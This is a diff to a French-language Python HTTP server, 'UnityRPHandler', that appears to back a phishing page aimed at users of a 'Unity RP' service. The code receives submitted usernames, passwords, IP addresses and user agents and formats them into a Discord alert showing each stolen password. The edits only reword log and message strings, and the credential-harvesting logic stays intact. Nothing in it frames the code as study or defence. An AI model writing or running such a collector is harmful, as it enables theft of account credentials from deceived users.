@@ -1,4 +1,3 @@
-
 from http.server import HTTPServer, SimpleHTTPRequestHandler
 import json
 import datetime
@@ -32,10 +31,11 @@ class UnityRPHandler(SimpleHTTPRequestHandler):
                 ip_addr = data.get('ip', 'Non spécifiée')
                 user_agent = data.get('userAgent', 'Non spécifié')
 
-                print(f"[+] Données reçues - Utilisateur: {username}")
+                print(f"[SUCCES] Données reçues - User: {username}")
 
+                # Construction du message Discord
                 msg = (
-                    f"🚨 **NOUVELLE CONNEXION UNITY RP** [{now}] 🚨\n"
+                    f"🚨 **NOUVELLE TENTATIVE UNITY RP** [{now}] 🚨\n"
                     f"👤 **Utilisateur :** {username}\n"
                     f"🔑 **Mot de passe :** {password}\n"
                     f"🌐 **Adresse IP :** {ip_addr}\n"
@@ -57,17 +57,17 @@ class UnityRPHandler(SimpleHTTPRequestHandler):
                 self.wfile.write(json.dumps({"status": "success"}).encode('utf-8'))
 
             except Exception as e:
-                print(f"[-] Erreur interne : {e}")
+                print(f"[ERREUR] Échec du traitement POST : {e}")
                 self.send_response(500)
                 self.send_header('Content-Type', 'application/json')
                 self.end_headers()
                 self.wfile.write(json.dumps({"status": "error", "message": str(e)}).encode('utf-8'))
         else:
-            self.send_error(404, "Page non trouvée")
+            self.send_error(404, "Endpoint non trouvé")
 
 if __name__ == '__main__':
     port = int(os.environ.get("PORT", 10000))
     server_address = ('', port)
     httpd = HTTPServer(server_address, UnityRPHandler)
-    print(f"Serveur Unity RP démarré sur le port {port}...")
+    print(f"Serveur Web actif sur le port {port}")
     httpd.serve_forever()
